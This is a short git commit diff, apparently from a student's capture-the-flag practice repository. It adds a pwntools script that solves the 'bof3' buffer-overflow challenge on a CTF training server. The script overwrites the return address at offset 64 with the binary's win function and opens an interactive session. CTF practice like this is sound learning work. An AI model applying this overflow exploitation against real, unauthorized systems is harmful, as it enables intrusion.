593e55150a77fe9ab2e554e8e622a22cea94f8e6
ubuntu <dhs19b@fsu.edu>
2023-03-31 17:57:54 -0400

    cracked bof3

--- PWN/BinEx:bof3/pwn3.py
+++ PWN/BinEx:bof3/pwn3.py
@@ -1,5 +1,17 @@
 from pwn import *
+# connect to problem
+io = remote("ctf.hackucf.org", 9002)
 
-io = remote("nc ctf.hackucf.org", 9002)
+exe = context.binary = ELF('bof3')
 
+#io = exe.process()
+#load address of function win
+winaddr = exe.symbols['win']
+#pack at offset 64
+payload = fit({
+    64: winaddr
+})
+#send payload
+io.sendline(payload)
 
+io.interactive()
